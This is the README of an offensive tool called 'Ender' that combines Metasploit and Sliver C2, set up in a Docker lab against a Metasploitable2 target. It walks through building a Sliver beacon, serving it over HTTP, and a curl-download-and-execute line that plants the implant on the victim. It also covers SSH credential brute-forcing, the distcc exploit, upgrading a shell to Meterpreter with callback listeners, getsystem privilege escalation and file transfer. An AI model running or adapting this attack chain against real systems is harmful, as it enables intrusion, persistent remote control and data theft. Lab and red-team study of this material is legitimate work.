# Ender
Exploit Engine for Multiple C2s interlaced with Eshu for Post-Exploitation

Go to Ender directory
```bash
docker compose up -d --build
```

#### A note on Sliver persistence
Any Sliver .cfg file you make or Sliver beacon you create will persist throughout sessions.

So if you compose up/down or start/stop, your previous .cfg files and beacons will persist.

#### Testing Ender server and metasploit

To try out CLI
Terminal 1:
```bash
docker exec -it operator /bin/bash
python ender_server/server.py
```

Terminal 2:
```bash
docker exec -it operator /bin/bash
python ender_client/client.py
```

Enter: 
```bash
connect
```

To test search exploits / auxiliary, type:
```bash
search exploit/auxiliary "module_name"
```

To test run exploit, type:
```bash
run exploit/auxiliary "module_name"
```

Type in parameters when needed

Example of "run exploit/auxiliary" with scanner/ssh/ssh_login:
```bash
[SERVER] Received: Please enter USERNAME: 
Please enter USERNAME:  msfadmin
[SERVER] Received: Please enter PASSWORD: 
Please enter PASSWORD:  msfadmin
[SERVER] Received: Please enter RHOSTS: 
Please enter RHOSTS:  10.1.1.3
[SERVER] Received: Please enter THREADS (default: 1): 
Please enter THREADS (default: 1):  5
[SERVER] Received: Please enter RPORT (default: 22): 
Please enter RPORT (default: 22):  22
[SERVER] Received: {"job_id": 0, "uuid": "IKVE2Yb1HvmtjnUs1Vql2t4L"}
{"job_id": 0, "uuid": "IKVE2Yb1HvmtjnUs1Vql2t4L"}
```

Do NOT CLOSE Ender Server or Client while continuing

## To run Eshu's main.py code:
Start up new terminal
```console
docker exec -it operator /bin/bash
```

To test network connection to vulnerable machine(VM) OPTIONAL
```bash
ping -c 4 10.1.1.3
nmap -l metasploitable2
```

#### Firstly, creating a sliver beacon
In one terminal (Sliver Server):
```bash
docker exec -it operator /bin/bash
root@operator:/workspace/enderCLI# python ender_server/server.py
```

In second terminal (Sliver Client):
```bash
docker exec -it operator /bin/bash
root@operator:/workspace/enderCLI# python ender_client/client.py
Enter message (or 'quit' to exit): create_beacon operator1 10.1.1.2 5 0 10.1.1.2 linux amd64 testbeacon (option "shellcode" optional)
```

Go back to the first terminal to monitor the Sliver beacon creation and verify that beacon is created

#### Secondly, set up server to transfer implant for exploitation
In third terminal (operator workspace):
```bash
docker exec -it operator /bin/bash
root@operator:/workspace/enderCLI# python -m http.server 8080
```

#### Thirdly, download and run implant on vulnerable machine
In fourth terminal (metasploitable2):
```bash
docker exec -it metasploitable2 /bin/bash
curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
```
***CHANGE 3 instances of "testbeacon" if necessary in the previous command***

Check the sliver-client terminal to see the beacon connection.

#### Stop Python Server in Third Terminal
In the third terminal with the http server, ctrl-c once the GET request is made

#### Get the Sliver Beacon ID
In the Ender client, get the Sliver Beacon ID
```bash
Enter message (or 'quit' to exit): get-sliver-beacons
```

#### Use the Sliver Beacon ID to Hand it off to Metasploit
Using the most recent Beacon ID, hand off the beacon to Metasploit
```bash
Enter message (or 'quit' to exit): sliver {beacon_id} handoff_to_metasploit
```
Monitor the handoff in the Sliver server to verify that the handoff is successful

#### Optional, run main.py for simultaneous Metasploit and Sliver behavior
Run the following in workspace#:
```bash 
python src/main.py
```
# Using Meterpreter
Once a successful exploit has been executed, you can use Meterpreter to interact with the compromised machine.
### Example
Connect to the Metasploit RPC server:
```bash
connect
(Optional) Search for modules:
search exploits <keyword>
search auxiliary <keyword>
```
## 1. Execute an Exploit
Run an exploit module; you will be prompted for any required options
```bash
run exploit unix/misc/distcc_exec
```
## 2. Check active sessions
To see active Meterpreter sessions:
```bash
sessions
```
Output will include:

    Session ID
    Type (shell/meterpreter)
    Host and Port
    Via (module that created the session)

run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555

## 3. Upgrade to a Meterpreter Shell

If you have only a plain shell, upgrade it to Meterpreter for richer functionality:

    run post multi/manage/shell_to_meterpreter SESSION=<id> LHOST=<your_ip> LPORT=<listener_port>

Example:

    run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555

## 4. Interact with a Meterpreter Session

Replace <session_id> with the actual ID from sessions:

### a. Basic commands
```
meterpreter <session_id> sysinfo   # System information
meterpreter <session_id> ps        # List processes
meterpreter <session_id> getsystem # Attempt privilege escalation
```

### b. File operations
```
meterpreter <session_id> upload /local/path /remote/path   # Upload file
meterpreter <session_id> download /remote/path /local/path # Download file
```

### c. Interactive shell
```
meterpreter <session_id> shell   # Drop into a command shell
```

### d. Exit session
```
meterpreter <session_id> exit    # Close the Meterpreter session
```

## 5. Clean Up
To stop all running containers
```console
docker compose stop
```

If stopped, start again with
```console
docker-compose start
```

To kill and remove all the running containers
```console
docker compose down
```
